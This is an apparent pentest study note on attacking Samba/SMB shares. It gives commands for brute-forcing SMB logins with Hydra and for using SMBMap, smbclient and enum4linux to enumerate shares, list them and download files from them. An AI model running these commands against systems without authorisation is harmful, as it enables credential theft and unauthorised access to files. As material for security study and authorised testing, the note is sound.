# Exploiting Samba
> SMB is the Server Message Block network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a LAN. Samba is the Linux implementation of SMB and it allows Windows systems to access Linux shares and devices.

Samba (SMB) Default Port: `445`
- SMB originally ran on top of NetBIOS using port `139` and you can still find machines that run both (for backwards compatibility).

## Contents


## Intro

### Susceptible to Attacks
- Samba is susceptible to the same attacks as Windows.
  - PsExec
  - CrackMapExec
  - MetaSploit module(s)

### Exploiting Samba
- Samba utilizes username and password authentication in order to obtain access to the server or a network share.

#### [Hydra](../../hydra.md)
- We can perform a brute-force attack on the samba server in order to obtain legitimate credentials.
- After obtaining legitimate credentials, we can use a utility called SMBMap

#### [SMBMap](../../04_Enumeration/enum_smb.md#smbmap)
- Enumerate samba sare drives.
- List the contents of the shares.
- Upload/Download/Execute files.

#### [smbclient](../../04_Enumeration/enum_smb.md#smbclient)
- smbclient communicates with a LAN Manager server, offering an interface similar to that of the ftp program.
- It can be used to download files from the server to the local machine.
- It can also upload goodies from the local machine to the target.
- And it can retrieve directory information from the server.

#### [enum4linux](../../04_Enumeration/enum_smb.md#enum4linux)
- Another tool. More information.

## Exploit

### [Hydra](../../hydra.md)
```
hydra -l admin -P /usr/share/.../unix_passwords.txt smb://[target ip]
```
- Brute-force login creds with Hydra.

### [SMBMap](../../04_Enumeration/enum_smb.md#smbmap)
```
smbmap                                        # this will show you usage
smbmap -h [target ip] -u admin -p password1   # this shows you the shares (each with specified perms)
```
- Now... How do you access these shares? With smbclient...

### [smbclient](../../04_Enumeration/enum_smb.md#smbclient)
```
smbclient       # usage
man smbclient   # usage
smbclient -L [target ip] -U admin               # enter... prompted for pwd
smbclient //[target ip]/[share name] -U admin   # enter... prompted for pwd
```
- `-L`  is to List out the shares
  - This should give you pretty much the same info we got from SMBMap
- If successful, you will get a prompt: `smb: \>`
  - Look around in the share to see if there are goodies to download. If not, try the next share.
  - Lather. Rinse. Repeat.
  - To download: `get [filename]`

### [enum4linux](../../04_Enumeration/enum_smb.md#enum4linux)
```
enum4linux -a [target ip]
enum4linux -a -u admin -p password1 [target ip]   
```
- `-a`  All option to enumerate all the crap you can.
- Lots of the same info, but at the bottom it lets you know that the server does not allow null sessions (empty usernames and passwords).
  - If they were allowed, we'd get a butt ton more info from enum4linux
- There's your butt ton of information (comprehensive)
